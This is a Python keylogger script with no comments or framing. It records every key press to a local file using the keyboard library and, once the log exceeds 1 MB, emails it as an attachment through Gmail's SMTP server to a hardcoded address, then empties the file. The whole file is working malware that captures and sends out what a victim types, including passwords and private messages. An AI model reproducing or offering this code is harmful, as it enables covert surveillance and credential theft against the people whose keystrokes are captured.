import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import keyboard

sender_email = "thisanewcodehowareyou@gmail.com"
receiver_email = "thisanewcodehowareyou@gmail.com"
subject = "Keystrokes Log"
body = "Please find the attached keystrokes log file."

def send_email_with_attachment(filename):

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    message.attach(MIMEText(body, "plain"))

    with open(filename, "rb") as attachment:

        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    message.attach(part)
    text = message.as_string()

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, "your_password")  
        server.sendmail(sender_email, receiver_email, text)

def on_key(event):
    key = event.name
    with open("keystrokes.txt", "a") as file:
        file.write(key + "\n")

    file_size_threshold = 1 * 1024 * 1024  
    if file.tell() > file_size_threshold:
        file.close()
        send_email_with_attachment("keystrokes.txt")
        with open("keystrokes.txt", "w") as file:
            pass

keyboard.on_press(on_key)

while True:
    keyboard.wait()
